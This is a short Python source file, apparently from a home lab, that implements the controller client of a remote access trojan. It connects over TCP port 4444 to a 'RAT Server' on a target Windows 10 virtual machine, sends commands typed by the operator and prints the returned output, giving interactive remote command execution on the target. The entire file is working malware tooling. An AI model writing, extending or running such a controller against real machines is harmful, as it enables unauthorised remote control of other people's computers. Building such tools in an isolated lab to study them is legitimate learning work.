import socket
import threading

def receive_output(client_socket):
    while True:
        try:
            # Receive data from the server
            response = client_socket.recv(4096).decode()
            print(response, end="")
        except:
            break

def start_client():
    # --- CONFIGURATION ---
    # Enter the IP address of your Windows 10 VM here
    target_ip = "REDACTED_INTERNAL_IP" 
    
    port = 4444
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client_socket.connect((target_ip, port))
        print(f"[+] Connected to RAT Server on {target_ip}!")
        
        # Start a separate thread to continuously receive output
        receive_thread = threading.Thread(target=receive_output, args=(client_socket,))
        receive_thread.daemon = True
        receive_thread.start()
        
        # Main loop to send commands
        while True:
            # Prompt with the target IP
            command = input(f"{target_ip}> ")
            
            if command.lower() == "exit":
                client_socket.send(command.encode())
                break
            
            client_socket.send(command.encode())
            
    except ConnectionRefusedError:
        print("[-] Connection Refused. Is the server running on the VM?")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    start_client()